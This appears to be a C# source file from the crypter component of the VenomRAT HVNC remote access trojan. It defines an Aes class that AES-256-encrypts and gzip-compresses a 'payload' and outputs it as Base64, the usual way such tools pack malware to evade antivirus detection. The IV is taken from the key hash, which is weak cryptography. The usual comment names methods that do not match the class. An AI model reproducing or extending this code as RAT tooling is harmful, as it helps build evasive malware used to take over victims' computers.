using System;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace VenomRAT_HVNC.Crypter.Algorithms
{
    public class Aes
    {
        // Utilisation : Encryptions.AES_Encrypt(Encryptions.Compress(input),"key");
        public static string Encrypt(byte[] payload, string key)
        {
            using (AesManaged aes256 = new AesManaged())
            {
                using (SHA256CryptoServiceProvider sha256Hash = new SHA256CryptoServiceProvider())
                {
                    byte[] hash = sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(key));
                    aes256.KeySize = 256;
                    aes256.BlockSize = 128;
                    aes256.Key = hash.Take(aes256.KeySize / 8).ToArray();
                    aes256.IV = hash.Take(aes256.BlockSize / 8).ToArray();
                    aes256.Mode = CipherMode.CBC;
                    byte[] encrypt;
                    using (MemoryStream memoryStream = new MemoryStream())
                    {
                        using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes256.CreateEncryptor(),
                                   CryptoStreamMode.Write))
                        {
                            cryptoStream.Write(payload, 0, payload.Length);
                            cryptoStream.FlushFinalBlock();
                            encrypt = memoryStream.ToArray();
                        }
                    }

                    return Convert.ToBase64String(encrypt);
                }
            }
        }

        public static byte[] Compress(byte[] data)
        {
            using (MemoryStream memoryStream = new MemoryStream())
            {
                using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Compress, true))
                {
                    gzipStream.Write(data, 0, data.Length);
                }

                return memoryStream.ToArray();
            }
        }
    }
}